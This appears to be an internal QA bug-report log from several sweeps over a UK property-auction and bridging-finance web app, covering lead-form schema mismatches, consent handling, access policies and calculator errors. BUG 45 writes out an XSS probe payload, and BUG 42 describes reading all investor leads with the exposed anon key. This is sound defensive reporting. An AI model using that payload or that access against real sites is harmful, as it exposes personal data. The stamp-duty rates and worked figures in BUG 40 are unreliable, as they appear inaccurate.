**File:** server.js lines 715-717 vs leads_schema.sql lines 13-15
**Area:** Enquiry Form — Submission (Column Name Mismatch: server inserts `name`/`email`/`phone` but schema defines `investor_name`/`investor_email`/`investor_phone`)
**Severity:** Critical
**Description:** The `/api/leads` endpoint inserts `{ name, email, phone }` as column names (server.js lines 715-718), but the `leads` table schema (leads_schema.sql lines 13-15) defines the columns as `investor_name`, `investor_email`, `investor_phone`. If the table was created using the schema file, every lead insertion would either: (a) fail with a "column does not exist" error from Postgres, or (b) succeed only if the table was manually altered to use `name`/`email`/`phone` instead. Either the schema file is stale (documenting the intended structure but not matching the live table), or the live table matches the schema and every lead submission is silently failing. This is a data-loss-level bug if the table matches the schema.
**Reproduction steps:**
1. Read leads_schema.sql — columns are `investor_name`, `investor_email`, `investor_phone`
2. Read server.js line 715-718 — inserts `name`, `email`, `phone`
3. If the live table uses `investor_*` prefixes, all inserts fail
**Suggested fix:** Reconcile the column names. Either update server.js to use `investor_name`, `investor_email`, `investor_phone`, or update the schema file to match the actual live table columns. Check the live Supabase table to determine which is correct.
---

## BUG 36
**File:** server.js line 732 vs leads_schema.sql line 39
**Area:** Enquiry Form — Submission (Column Name Mismatch: `deal_data` vs `deal_data_json`)
**Severity:** Critical
**Description:** The server inserts into column `deal_data` (server.js line 732), but the schema defines the column as `deal_data_json` (leads_schema.sql line 39). Same class of bug as BUG 35 — either the insert fails silently or the schema is stale.
**Reproduction steps:**
1. Read server.js line 732 — inserts `deal_data: ...`
2. Read leads_schema.sql line 39 — column is `deal_data_json jsonb`
3. Column name mismatch will cause insert failure if schema matches live table
**Suggested fix:** Align the column name in server.js to match the live table. If the live table uses `deal_data_json`, change server.js line 732 to `deal_data_json:`.
---

## BUG 37
**File:** server.js line 733 vs leads_schema.sql (no ip_address column)
**Area:** Enquiry Form — Submission (Inserting into Non-Existent Column `ip_address`)
**Severity:** High
**Description:** The server inserts `ip_address: req.ip || null` (server.js line 733), but the `leads` table schema has no `ip_address` column. Postgres will reject the insert with "column ip_address does not exist" unless the column was added manually to the live table after the schema was created. If the live table doesn't have this column, every lead submission fails.
**Reproduction steps:**
1. Read leads_schema.sql — no `ip_address` column exists in the CREATE TABLE statement
2. Read server.js line 733 — attempts to insert `ip_address`
**Suggested fix:** Either add `ip_address text` to the leads table schema and live table, or remove the `ip_address` field from the insert in server.js.
---

## BUG 38
**File:** server.js line 734; leads_schema.sql line 49
**Area:** Enquiry Form — Data Integrity (Consent Defaults to TRUE Without Explicit Consent)
**Severity:** High
**Description:** The server.js `/api/leads` insert does NOT include `consent_given` or `consent_timestamp` fields. The schema defaults `consent_given` to `true` and `consent_timestamp` to `now()`. This means every lead — including landing page email captures (which have no consent checkbox, per BUG 31) and BridgeMatch Lite submissions where the pre-checked checkbox was not actively toggled (per BUG 6) — is recorded as having given consent. The server never checks or passes the consent state from the client. Even if a user somehow unchecked the consent box and submitted (which would be caught client-side), the server doesn't receive or store the actual consent value.
**Reproduction steps:**
1. Read server.js lines 712-735 — no `consent_given` field in the insert
2. Read leads_schema.sql line 49 — `consent_given boolean DEFAULT true`
3. All leads are stored as `consent_given = true` regardless of actual consent
**Suggested fix:** Pass the `consent` field from the client payload and store it explicitly: `consent_given: !!consent`. Do not rely on a database default for legally significant consent tracking.
---

## BUG 39
**File:** server.js line 734; leads_schema.sql line 11
**Area:** Enquiry Form — Data Integrity (Duplicate `created_at` — Client vs Server Default)
**Severity:** Low
**Description:** The server insert includes `created_at: new Date().toISOString()` (server.js line 734), but the schema also defines `created_at timestamptz DEFAULT now()` (leads_schema.sql line 10). This is technically fine — the explicit value overrides the default — but the server generates the timestamp as an ISO string in the Node.js process timezone, while the Postgres `now()` default would use the database server's timezone (typically UTC). If the Railway server has a non-UTC timezone configured, the stored `created_at` could differ from what `DEFAULT now()` would produce, creating subtle timezone inconsistencies if some rows use the default and others use the explicit value.
**Reproduction steps:** Low-impact edge case — only matters if timezone handling is inconsistent.
**Suggested fix:** Either remove `created_at` from the server insert (let the DB default handle it) or ensure the Node.js process uses UTC: `new Date().toISOString()` always produces UTC, which is fine if Postgres interprets it correctly as `timestamptz`.
---

## BUG 40
**File:** bridgematch-lite.html line 464
**Area:** Deal Stacking — Data Integrity (SDLT Applies Standard Rates Instead of Investor Surcharge Rates)
**Severity:** Critical
**Description:** Confirming and extending BUG 19 with specific rate analysis. The bridgematch-lite.html SDLT formula charges: 0% on first £250k, 5% on £250k-£925k, 10% on £925k+. The correct investor (additional property) rates as of April 2025 are: 5% on first £250k, 10% on £250k-£925k, 15% on £925k-£1.5m, 17% on £1.5m+. The formula appears to use *standard residential rates* (pre-2025) rather than the additional property surcharge rates. For the tool's primary audience (property investors), every single SDLT figure shown is wrong. Specific examples:
- £150,000 property: shows £0, correct is £7,500 (off by £7,500)
- £300,000 property: shows £2,500, correct is £17,500 (off by £15,000)
- £500,000 property: shows £12,500, correct is £37,500 (off by £25,000)
This directly impacts the "Total Cash Needed" and ROI figures shown to investors.
**Reproduction steps:**
1. Open BridgeMatch Lite, enter purchase price £300,000, cash £75,000
2. Observe Stamp Duty shown as ~£2,500
3. Correct investor SDLT = £250,000 × 5% + £50,000 × 10% = £17,500
**Suggested fix:** Replace line 464 with the investor-rate SDLT calculation from index.html's `calcSDLT()` function (lines 2430-2436), which correctly applies the 5% surcharge.
---

## BUG 41
**File:** index.html lines 2608-2672 (Finance Check widget)
**Area:** Enquiry Form — Structure (Finance Check Widget Does Not Pre-Fill Property Type)
**Severity:** Medium
**Description:** The "Finance Check" widget in the lot detail view links to BridgeMatch Lite with URL parameters for guide price and address, but does NOT pass the property type. The lot data includes `propType` (e.g., 'House', 'Flat', 'Commercial'), but this is not included in the BridgeMatch Lite URL. When the user arrives at BridgeMatch Lite, they must manually select the property type, despite it being known from the listing data. This adds unnecessary friction.
**Reproduction steps:**
1. Expand any lot detail on the auctions page
2. Click the "Finance Check" or BridgeMatch link
3. Observe that price and address may be pre-filled but property type is not
**Suggested fix:** Add `&type=${encodeURIComponent(lot.propType)}` to the BridgeMatch Lite URL and handle the `type` URL parameter in BridgeMatch Lite to pre-select the property type dropdown.
---

## BUG 42
**File:** server.js line 62 (RLS policy); leads_schema.sql line 62
**Area:** Enquiry Form — Security (Leads Table RLS Policy Grants Full Access to All Roles)
**Severity:** High
**Description:** The RLS policy on the leads table is `CREATE POLICY "Service role full access" ON leads FOR ALL USING (true) WITH CHECK (true)`. This grants full read/write/delete access to ALL roles, not just the service role. The `anon` key (used by the frontend Supabase client) would have full access to read, modify, and delete all leads. While the app accesses leads via the server-side API (which uses the service key), the Supabase anon key is exposed in the frontend JavaScript — anyone could use it to directly query the leads table and access all investor contact details.
**Reproduction steps:**
1. Find the Supabase anon key in the frontend code
2. Use the Supabase JS client with the anon key to query `leads` table
3. All leads (names, emails, phones, deal data) are accessible
**Suggested fix:** Restrict the RLS policy to service role only: `CREATE POLICY "Service role only" ON leads FOR ALL TO service_role USING (true) WITH CHECK (true)`. Add a separate restrictive policy for the anon role (or deny access entirely).
---

## BUG 43
**File:** index.html line 2440
**Area:** Deal Stacking — Dead Code (calcDealAnalysis Never Called)
**Severity:** Medium
**Description:** The `calcDealAnalysis()` function (lines 2440-2453) is defined but never invoked anywhere in the codebase. It calculates uplift, profit, SDLT, bridging costs, and ROI — core deal stacking logic — but no UI element or event handler calls it. This means the deal stacking feature referenced in the mission brief doesn't exist in the frontend at all. The function is dead code. There is no "Coming Soon" gate on deal stacking because the feature was never wired up to begin with.
**Reproduction steps:**
1. Search for `calcDealAnalysis(` in index.html — only the function definition appears, no invocations
2. There is no UI button or panel that triggers deal stacking
**Suggested fix:** Either wire `calcDealAnalysis()` into the expanded lot panel (e.g., auto-calculate when a lot is expanded and has both `price` and `streetAvg`), or remove the dead code. If the feature isn't ready, add a visible "Coming Soon" placeholder in the lot detail view where deal stacking would appear.
---

## BUG 44
**File:** index.html line 2649; bridgematch-lite.html (no cross-origin handling)
**Area:** Finance Check Widget — Data Integrity (Cross-Origin API Call to bridgematch.co.uk May Fail)
**Severity:** Medium
**Description:** The Finance Check widget at line 2649 calls `fetch('https://www.bridgematch.co.uk/api/filter', ...)` — a hardcoded absolute URL to the production BridgeMatch bridging tool. If the auction tool is served from a different origin (e.g., `auctionbrain.co.uk`, or a Railway preview deployment at `*.up.railway.app`), this cross-origin request will fail unless `bridgematch.co.uk` has a permissive CORS policy. Even if both run on `bridgematch.co.uk`, the hardcoded URL means local development and staging environments cannot test the Finance Check widget without hitting production. There is no fallback or error message indicating this is a cross-origin issue — the generic "Unable to check finance — try again later" is shown.
**Reproduction steps:**
1. Access the auction tool from any non-`bridgematch.co.uk` origin (e.g., localhost:3000)
2. Expand a lot and click "Check finance"
3. The fetch will fail with a CORS error, silently caught, showing generic error message
**Suggested fix:** Use a relative URL (`/api/filter`) if the bridging API is on the same origin, or add proper CORS headers on `bridgematch.co.uk/api/filter`. For local development, consider a server-side proxy route.
---

## BUG 45
**File:** index.html line 2666
**Area:** Finance Check Widget — XSS in Results Link
**Severity:** Medium
**Description:** The Finance Check results link at line 2666 constructs an `<a href>` using `encodeURIComponent()` for `loanAmount` and `lot.price`, but `apiType` is constructed from `lot.propType` (line 2645) using string `.includes()` checks. If `lot.propType` contains unexpected characters (possible from AI extraction), `apiType` falls through to the default `'house'` string — which is safe. However, the `count` variable (from the API response) is interpolated directly into text content (`'See all ' + count + ' matches'`) — if the API returned a non-numeric `count`, it could inject HTML. The `.innerHTML` assignment makes this a potential XSS vector if the external API response is malicious or tampered with.
**Reproduction steps:**
1. If `bridgematch.co.uk/api/filter` were compromised or returned `{"summary":{"eligible":"<img src=x onerror=alert(1)>"}}`, the `count` variable would contain an HTML string
2. This would be injected via `.innerHTML` at line 2667
**Suggested fix:** Sanitize the API response: `const count = parseInt(data.summary?.eligible, 10) || data.eligible?.length || 0;` (the current code already does `|| 0` but doesn't enforce numeric type). Also consider using `esc()` for lender names at line 2663 — this IS done correctly with `esc(l.name || l.lender || l)`. The main risk is the `count` variable.
---

## BUG 46
**File:** bridgematch-lite.html lines 1004-1025
**Area:** Enquiry Form — Pre-fill (URL Parameter `type` Not Used to Pre-Select Property Type)
**Severity:** Low
**Description:** The BridgeMatch Lite form reads URL parameters for `price` and `address` (lines 1004-1025) to pre-fill the calculator, but does not read or use a `type` parameter. When a user clicks "BridgeMatch It" from the auction lot detail, the property type is known but not passed. Even if Bug 41's suggested fix adds `&type=...` to the URL, the BridgeMatch Lite code has no handler to read it and pre-select the property type dropdown.
**Reproduction steps:**
1. Navigate to `/check?price=150000&address=123+High+St&type=flat`
2. The price and address are pre-filled, but the property type dropdown defaults to the first option
**Suggested fix:** In the URL parameter handler (lines 1004-1025), add: `const type = params.get('type'); if (type) { /* map to dropdown value and pre-select */ }`.
---

## BUG 47
**File:** index.html lines 2515-2517
**Area:** Data Integrity — Score Badge Shows Raw Unclamped Score
**Severity:** Low
**Description:** Related to Bug 25 but specifically about display: the score badge at line 2515-2517 shows the raw unclamped score with a `+` sign prefix for positive values. A lot with score 13.0 (possible per Bug 25) would display as `+13` in the badge. Users seeing scores above 10 on what they'd expect to be a 0-10 scale may lose trust in the scoring system. The badge CSS classes (`high`/`mid`/`low`) work correctly since they only check `>= 3` and `>= 1`, but the displayed number is misleading.
**Reproduction steps:**
1. Find a lot with many positive signals (e.g., executor sale + derelict + freehold + development + below market + high yield)
2. The badge will show a score like +13 or higher
**Suggested fix:** Clamp the displayed score: `Math.min(10, Math.max(0, lot.score))` when rendering, or better yet fix the underlying scoring to clamp (Bug 25).
---

## BUG 48
**File:** server.js lines 692-784
**Area:** Enquiry Form — Validation (No Server-Side Email Format Validation Beyond `@` Check)
**Severity:** Low
**Description:** Server-side email validation at line 708 only checks `email.includes('@')`. This accepts strings like `@`, `@@@@`, `foo@`, `@bar`, `a@b` (no TLD). While comprehensive email validation via regex is fraught, a basic check like requiring at least one character before `@`, at least one `.` after `@`, and at least 2 characters after the final `.` would catch obvious garbage without over-validating. The same weak validation exists client-side (Bug 4), meaning invalid emails pass through both layers and reach the database, wasting storage and causing failed notification emails.
**Reproduction steps:**
1. POST to `/api/leads` with `{ name: "Test", email: "@", phone: "07777777777" }`
2. The lead is created with email "@" in the database
3. The Resend notification email will fail silently for this invalid address
**Suggested fix:** Add a basic server-side regex check: `/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)`.
---

## BUG 49
**File:** index.html lines 2459; server.js (CSV export exposes raw data)
**Area:** Data Integrity — CSV Export Includes Yield and Comparable Data Without "Coming Soon" Gate
**Severity:** Medium
**Description:** The CSV download function `dlCSV()` at line 2457-2459 exports all lot data including `streetAvg`, `belowMarket%`, `estGrossYield%`, and `estMonthlyRent` — data that is supposed to be gated behind "Coming Soon" per the mission brief. Even if the frontend UI hides or de-emphasises these fields in the lot cards, any user who clicks "Download CSV" gets the full unredacted data. This bypasses any intended gating of these analytics features.
**Reproduction steps:**
1. Load the auctions page with lots
2. Click the CSV download button
3. Open the CSV — columns for StreetAvg, BelowMkt%, EstYield%, EstRent/mo are populated with data
**Suggested fix:** Either remove these columns from the CSV export until the features are launched, or accept that this data is already available (it is shown in the lot card opportunities like "X% below market" and used for sorting by yield).
---

## BUG 50
**File:** index.html line 2661
**Area:** Finance Check Widget — Data Integrity (Lender Count Type Coercion Bug)
**Severity:** Low
**Description:** The Finance Check widget pluralises "lender/lenders" using `count !== 1` (strict inequality). However, `count` is assigned from `data.summary?.eligible || data.eligible?.length || 0`. If the external BridgeMatch API returns `summary.eligible` as the string `"1"` (which is common in JSON APIs that serialize numbers as strings), `"1" !== 1` evaluates to `true`, so the text would read "1 lenders match" instead of "1 lender matches". The `||` fallback chain also means a `0` value from the API would fall through to `data.eligible?.length`, potentially showing a different number than intended.
**Reproduction steps:**
1. Mock the BridgeMatch API to return `{ "summary": { "eligible": "1" } }`
2. The widget will display "1 lenders match" (plural) instead of "1 lender matches" (singular)
**Suggested fix:** Coerce `count` to a number: `const count = Number(data.summary?.eligible) || data.eligible?.length || 0;` before the pluralisation check.
---

## BUG 51
**File:** index.html line 2637
**Area:** Finance Check Widget — Data Integrity (LTV Slider parseInt Without Radix)
**Severity:** Low
**Description:** `parseInt(document.getElementById('ltv-slider-' + idx)?.value || 70)` is called without specifying the radix parameter. While modern browsers default to base 10 for numeric strings, the `parseInt` call also has an `|| 70` fallback that applies to the `.value` property, not the parsed result. If the slider element doesn't exist (`?.value` returns `undefined`), `undefined || 70` evaluates to `70` (number), and `parseInt(70)` = `70` — this works. But if `.value` is `""` (empty string), `"" || 70` evaluates to `70` — also fine. However, `parseInt("0" || 70)` would parse "0" correctly. The edge case is if the slider value were somehow "08" or "09" on very old browsers — `parseInt("08")` without radix was historically octal, returning `0` instead of `8`. Not practically exploitable on modern browsers, but `parseInt(x, 10)` is the defensive standard.
**Reproduction steps:** Not practically reproducible on modern browsers.
**Suggested fix:** Add radix: `parseInt(..., 10)`.
---

## BUG 52
**File:** bridgematch-lite.html line 860 (onclick handler)
**Area:** Enquiry Form — Submission (Encoded Currency in onclick Attribute Breaks if Price Contains Single Quote)
**Severity:** Low
**Description:** The submit button onclick handler at line 860 constructs a function call with string arguments embedded in single-quoted attribute values: `onclick="submitLead('${encodeURIComponent(fmtCurrency(r.price))}', ...)"`. If `fmtCurrency` ever returns a value containing a single quote (e.g., from certain locale formatting or unexpected input), the onclick handler would break with a syntax error, silently preventing form submission. While `fmtCurrency` is unlikely to produce single quotes for GBP values, the pattern of embedding dynamic values into inline event handler strings is inherently fragile. Additionally, if `r.propType` contains a single quote (e.g., "Investor's Flat"), the 6th argument `'${r.propType||''}'` would break the onclick attribute.
**Reproduction steps:**
1. If a lot has `propType = "Investor's Choice"`, the onclick becomes: `submitLead(..., 'Investor's Choice')` — syntax error
2. The submit button becomes non-functional with no visible error
**Suggested fix:** Use `data-*` attributes to store the values and read them in the click handler, or escape single quotes in the interpolated values.
---

## BUG 53
**File:** index.html line 1264
**Area:** Yield Filtering — UX (High Yield Preset Only Sorts, Does Not Filter)
**Severity:** Medium
**Description:** Already partially documented in Bug 24, but noting an additional dimension: the "Yield 8%+" preset at line 1264 sets `$('fSort').value='yield'` but there is no `fMinYield` filter field anywhere in the filter panel. Unlike other presets which set actual filter values (e.g., `fMaxPrice`, `fCondition`, `fDeal`), the yield preset CANNOT filter because the filter infrastructure doesn't support a minimum yield threshold at all. The `renderLots()` function at line 2268+ has no yield filtering logic — it only filters by deal type, condition, tenure, location, price range, beds, postcode, and search text. This means even if a developer wanted to add yield filtering to the preset, they would need to add both the filter field AND the filtering logic in `renderLots()`.
**Reproduction steps:**
1. Inspect the filter panel HTML — no yield threshold input exists
2. Search `renderLots` function for "yield" — no yield-based filtering logic exists
3. The "Yield 8%+" button is functionally identical to manually setting sort to "yield"
**Suggested fix:** Add a `fMinYield` input to the filter panel and add yield threshold filtering in `renderLots()`. The preset should set this field to 8.
---

## BUG 54
**File:** server.js lines 6903-6928; index.html line 2268
**Area:** Data Integrity — Stale Comparables from 3-Year Window
**Severity:** Low
**Description:** Land Registry comparables use a 3-year lookback window. In fast-moving UK property markets (e.g., post-2023 rate changes), 3-year-old sales data can be significantly higher or lower than current values. A property bought for £250k in 2023 may be worth only £220k in 2026 due to rate rises, or conversely £300k in a recovering market. The streetAvg calculation makes no recency weighting — a sale from 36 months ago carries equal weight to one from last month. The "below market" scoring can therefore award +2 points based on outdated comparables. There is no visual indicator of the age of the comparable data shown to users.
**Reproduction steps:**
1. Find a lot in a postcode where most Land Registry sales are 2-3 years old
2. The streetAvg may significantly overstate or understate current market value
3. The "X% below market" badge could be misleading
**Suggested fix:** Add recency weighting to the street average calculation (e.g., sales from the last 6 months weighted 2x, 6-12 months weighted 1.5x, older at 1x). At minimum, display the date range of comparable sales so users can judge recency.
---

## BUG 55
**File:** bridgematch-lite.html line 465; line 466
**Area:** Deal Stacking — Data Integrity (Estimated Legal/Survey Costs Fixed at 4% of Price)
**Severity:** Low
**Description:** The `estCosts` calculation at line 465 uses `price * 0.04` (4% of purchase price). For a £50k flat, this estimates £2,000 for legal/survey/fees — which is likely too low (solicitors alone can cost £1,000-£1,500). For a £1m property, it estimates £40,000 — wildly excessive (actual costs around £5,000-£10,000). A fixed percentage doesn't reflect the reality that legal and survey costs are largely fixed with only modest scaling by price. The index.html version uses the same formula (line 2446).
**Reproduction steps:**
1. Enter a £1,000,000 property in BridgeMatch Lite
2. "Legal/Survey/Fees" shows ~£40,000 — a solicitor would charge ~£2,000-£3,000 and a survey ~£1,000-£2,000
3. Enter a £30,000 property — shows ~£1,200, but a solicitor alone would cost more
**Suggested fix:** Use a more realistic cost model: e.g., `Math.max(2000, Math.min(10000, price * 0.02))` to cap between £2,000 and £10,000, or use fixed band estimates.
---

## BUG 56
**File:** server.js line 741; bridgematch-lite.html line 970
**Area:** Enquiry Form — Data Integrity (Activity Log Exposes PII)
**Severity:** Medium
**Description:** The `logActivityEvent` call at server.js line 741 logs the user's email address and IP address: `logActivityEvent('lead_submit', { email, propertyPrice, loanAmount, isRegulated, source }, email, req.ip)`. If activity logs are stored in Supabase or written to stdout (visible in Railway logs), this constitutes PII storage outside the leads table. Railway logs may be retained beyond the data subject's requested deletion window. Under GDPR, all PII storage locations must be documented and subject to deletion requests. If a user requests data deletion, the activity log entries containing their email would also need to be purged.
**Reproduction steps:**
1. Submit a lead via BridgeMatch Lite
2. Check Railway logs — the email and IP are logged in the activity event
3. These logs may persist independently of any Supabase data deletion
**Suggested fix:** Hash the email in activity logs: `logActivityEvent('lead_submit', { emailHash: crypto.createHash('sha256').update(email).digest('hex').slice(0,12), propertyPrice, ... })`. Or omit PII from activity logs entirely.
---

## BUG 57
**File:** index.html line 2416
**Area:** Data Integrity — Auction Ended Badge Uses Client Timezone
**Severity:** Low
**Description:** The "Auction ended" badge logic at line 2416 compares `l._auctionDate` (ISO date string like "2026-03-14") against `new Date().toISOString().slice(0,10)`. The `new Date()` constructor uses the client's local timezone. For a user in UTC+12 (e.g., New Zealand), midnight on March 14 NZT is still March 13 UTC, so auctions that ended on the 13th in the UK would not show the "ended" badge until the NZ user's local date catches up. Conversely, a user in UTC-10 (Hawaii) might see an "ended" badge on an auction that is still live in the UK because their local date is behind. UK auction dates are UK timezone events, but the comparison uses the client's local date.
**Reproduction steps:**
1. Set system timezone to UTC+13
2. View lots on the evening of March 13 (UK time) — some lots with March 13 auction dates may or may not show "ended" depending on local date
**Suggested fix:** Compare against UK time explicitly: `new Date().toLocaleString('en-GB', { timeZone: 'Europe/London' })` or fetch server time.
---

## Sweep completed at 2026-03-14T19:30:00Z

---

# Sweep 2 — 2026-03-14

## BUG 58
**File:** server.js lines 716, 718
**Area:** Enquiry Form — Data Integrity (Name and Phone Not Trimmed Server-Side)
**Severity:** Low
**Description:** The `/api/leads` endpoint trims and lowercases the email at line 717 (`email: email.toLowerCase().trim()`), but `name` (line 716) and `phone` (line 718) are inserted as-is without trimming. If a user enters `"  John Smith  "` or `"  07700 900000  "`, the leading/trailing whitespace is stored in the database. This creates inconsistent data — querying by name or phone requires accounting for whitespace. The client-side does trim (`document.getElementById('leadName').value.trim()` at bridgematch-lite.html line 897), but direct API callers (curl, bots) bypass client-side validation.
**Reproduction steps:**
1. POST to `/api/leads` with `name: "  Test  "`, `email: "test@example.com"`, `phone: "  07700900000  "`
2. Check Supabase — `name` stored as `"  Test  "` with whitespace
**Suggested fix:** Add `.trim()` to name and phone before insert: `name: (name || '').trim()`, `phone: phone ? phone.trim() : null`.
---

## BUG 59
**File:** server.js line 767; bridgematch-lite.html line 970
**Area:** Enquiry Form — Submission (Email Notification Failure Not Surfaced)
**Severity:** Low
**Description:** The Resend email notification at server.js line 767 uses a fire-and-forget pattern: `fetch(...).catch(e => log.warn(...))`. If the Resend API is down, the API key is invalid, or the `from` address is unverified, the lead is saved to the database but Simon never receives the email notification. The only indication is a `log.warn` in Railway logs, which is easy to miss. There is no retry mechanism, no dead-letter queue, and no dashboard alert. For a lead-generation-critical system, silent email failure means potential leads are captured but never acted upon.
**Reproduction steps:**
1. Set `RESEND_API_KEY` to an invalid key
2. Submit a lead via BridgeMatch Lite
3. Lead is saved to database, success shown to user, but no email is sent — the `.catch` logs a warning that's only visible in Railway logs
**Suggested fix:** Consider logging failed email sends to a separate Supabase table (e.g., `email_failures`) or adding a periodic check that compares `leads` count to Resend delivery count. At minimum, upgrade from `log.warn` to `log.error` so it triggers Railway alerting if configured.
---

## BUG 60
**File:** index.html line 2649
**Area:** Finance Widget — Data Integrity (Finance API Called with Wrong Property Type Mapping)
**Severity:** Medium
**Description:** The `triggerFinanceCheck()` function at line 2644-2645 maps `lot.propType` to the BridgeMatch API's `property_type` parameter using substring matching: `propType.includes('flat') ? 'flat' : propType.includes('commercial') ? 'commercial' : propType.includes('land') ? 'land' : 'house'`. However, `lot.propType` values from the auction extraction are not standardised — they can be "Semi-Detached", "Terraced", "Detached", "Bungalow", "Flat/Maisonette", "Mixed Use", "Apartment", etc. The issue is that "Apartment" doesn't contain "flat", so apartments are mapped to "house", and "Mixed Use" doesn't contain "commercial", so mixed-use properties are mapped to "house". This sends incorrect property types to the BridgeMatch lender matching API, potentially returning lenders that don't fund that property type or excluding lenders that would.
**Reproduction steps:**
1. Find a lot with `propType: "Apartment"` or `propType: "Mixed Use"`
2. Click "Check finance" — the API receives `property_type: "house"` instead of "flat" or "commercial"
3. Lender results may be incorrect for the actual property type
**Suggested fix:** Expand the mapping to cover common auction lot property types: add `propType.includes('apartment') || propType.includes('maisonette')` to the flat condition, and `propType.includes('mixed')` to the commercial condition.
---

## BUG 61
**File:** index.html lines 2637, 2643
**Area:** Finance Widget — Data Integrity (LTV Slider parseInt Without Radix)
**Severity:** Low
**Description:** At line 2637, `parseInt(document.getElementById('ltv-slider-' + idx)?.value || 70)` lacks a radix parameter. While modern browsers default to base 10, the MDN specification recommends always specifying the radix to avoid ambiguity. Additionally, the fallback `|| 70` is evaluated on the string level — if the slider value is "0", the `||` operator treats the falsy string "0" and falls through to 70, which would be incorrect (though a 0% LTV makes no practical sense, the logical inconsistency could mask bugs during testing).
**Reproduction steps:** Minor — the `parseInt` without radix works correctly in all modern browsers for decimal values.
**Suggested fix:** Change to `parseInt(document.getElementById('ltv-slider-' + idx)?.value ?? '70', 10)` using nullish coalescing instead of logical OR.
---

## BUG 62
**File:** server.js lines 6629-6641
**Area:** Yield Calculation — Data Integrity (Negative Bed Count Produces Undefined Rent)
**Severity:** Low
**Description:** `estimateMonthlyRent()` uses `Math.min(beds ?? 2, 4)` to clamp bedroom count to max 4, but there's no lower bound check. If a DOM extractor or Gemini extraction returns `beds: -1` (e.g., parsing error), `Math.min(-1, 4)` returns `-1`, and `VOA_RENTS[key][-1]` returns `undefined`. `Math.round(undefined * uplift)` returns `NaN`. This propagates: `lot.estMonthlyRent = NaN`, `lot.estAnnualRent = NaN`, `lot.estGrossYield = NaN`. The lot card would display "NaN% yield" to users. While negative beds is unlikely, the extractor output is untrusted data.
**Reproduction steps:**
1. Inject a lot with `beds: -1` into the enrichment pipeline
2. `estimateMonthlyRent(address, -1)` returns NaN
3. The lot displays NaN for yield-related fields
**Suggested fix:** Add lower bound: `Math.min(Math.max(beds ?? 2, 0), 4)`.
---

## BUG 63
**File:** index.html line 2744
**Area:** Email Capture Form — Error Handling (Non-JSON Error Response Crashes Handler)
**Severity:** Low
**Description:** The `submitEmailCapture()` function at line 2744 chains `r.json().then(d => ({ ok: r.ok, data: d }))`. If the server returns a non-JSON response (e.g., Railway 502 HTML error page, or a text/plain error from a reverse proxy), `r.json()` throws a `SyntaxError: Unexpected token < in JSON at position 0`. The `.catch()` handler at line 2751 catches this, but displays the raw JSON parse error message to the user, which is confusing and unhelpful (user sees "Unexpected token < in JSON at position 0" instead of "Something went wrong").
**Reproduction steps:**
1. Simulate a 502 or 503 error where the response body is HTML (e.g., `<html>502 Bad Gateway</html>`)
2. The error message shown is the JSON parse error, not a user-friendly message
**Suggested fix:** Check `r.ok` before parsing JSON: `.then(r => { if (!r.ok) throw new Error('Something went wrong'); return r.json(); })`. Or wrap `.json()` in a catch that provides a fallback error message.
---

## BUG 64
**File:** server.js line 732
**Area:** Enquiry Form — Data Integrity (Source Field Merged Into deal_data Instead of Stored Separately)
**Severity:** Low
**Description:** At line 732, when `source` is truthy, `deal_data` is set to `{ source, ...(dealData || {}) }`. This merges the `source` field into the deal data JSON instead of storing it in the dedicated `source` column. Looking at the insert, there is no `source:` column being set in the Supabase insert at all — the `source` field from the request body is only used to determine if phone is required (line 705) and to merge into `deal_data`. The schema has a `source text DEFAULT 'bridgematch_lite'` column that is never explicitly set, so all leads will show `source: 'bridgematch_lite'` (the default) regardless of whether they came from the newsletter landing page or BridgeMatch Lite. This makes it impossible to filter leads by actual source in the Supabase dashboard.
**Reproduction steps:**
1. Submit a lead from the landing page email capture form (which sends `source: 'landing-page'`)
2. Check the Supabase `leads` table — the `source` column will show `'bridgematch_lite'` (default), not `'landing-page'`
3. The actual source is buried inside `deal_data_json` (if the column name was reconciled)
**Suggested fix:** Add `source: source || 'bridgematch_lite'` to the Supabase insert object so the source column is explicitly set.
---

## Sweep completed at 2026-03-14T21:15:00Z

---

# Sweep 3 — 2026-03-14

## Status Update on Previously Reported Bugs

The following bugs from Sweeps 1–2 have been **FIXED** since last reported:
- **BUG 1** (XSS in email) — FIXED: server now uses `escHtml()` for all interpolated values (lines 765-778)
- **BUG 4** (Weak email validation) — FIXED: both client (line 914) and server (line 720) now use `/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/`
- **BUG 5** (Phone accepts non-numeric) — FIXED: client now validates with `/^\+?[\d\s()-]{10,15}$/` (line 920)
- **BUG 6** (Consent pre-checked) — FIXED: `<input type="checkbox" id="leadConsent">` no longer has `checked` attribute (line 855)
- **BUG 19/40** (SDLT wrong in bridgematch-lite) — FIXED: line 464 now uses correct investor surcharge rates (5%/10%/15%/17%)
- **BUG 23** (totalCashNeeded wrong due to SDLT) — FIXED: consequence of Bug 19 fix
- **BUG 31** (No GDPR consent on email capture) — FIXED: consent checkbox with `required` attribute added (line 1018)
- **BUG 32** (Source bypass on phone) — FIXED: line 717 now checks `source !== 'landing-page'` specifically instead of truthy check
- **BUG 33** (Email subject injection) — FIXED: line 782 strips newlines from name before subject
- **BUG 35/36** (Column name mismatch) — FIXED: server now uses plain column names matching live table (lines 727-748)
- **BUG 38** (Consent defaults to TRUE) — FIXED: server now passes `consent_given: !!consent` (line 746)
- **BUG 48** (No server-side email format check) — FIXED: server uses regex at line 720
- **BUG 51** (parseInt without radix) — FIXED: line 2653 now uses `parseInt(..., 10)` with nullish coalescing
- **BUG 58** (Name/phone not trimmed) — FIXED: lines 728, 730 now trim
- **BUG 60** (Property type mapping misses apartment/mixed) — FIXED: line 2661 now uses regex `/flat|apartment|maisonette/` and `/commercial|mixed/`
- **BUG 64** (Source not stored in column) — FIXED: line 731 now stores `source: source || 'bridgematch_lite'`

The following bugs **remain open** from prior sweeps (verified still present):
- **BUG 2** (No rate limiting on /api/leads) — STILL OPEN
- **BUG 3** (No spam protection) — STILL OPEN (no honeypot/captcha found)
- **BUG 7** (FCA placeholder [FCA_NUMBER_NEEDED]) — STILL OPEN (lines 829, 986)
- **BUG 8** (No enquiry form on auction listing detail pages) — STILL OPEN
- **BUG 9/25** (Score not clamped 0-10) — STILL OPEN
- **BUG 10** (Bridging cost uses simple interest) — STILL OPEN (dead code, see BUG 43)
- **BUG 13** (Double-submit possible during latency) — STILL OPEN
- **BUG 15** (Street average mixes property types) — STILL OPEN
- **BUG 16** (Yield based on guide price not market value) — STILL OPEN
- **BUG 17** (calcDealAnalysis assumes streetAvg = GDV) — STILL OPEN (dead code, see BUG 43)
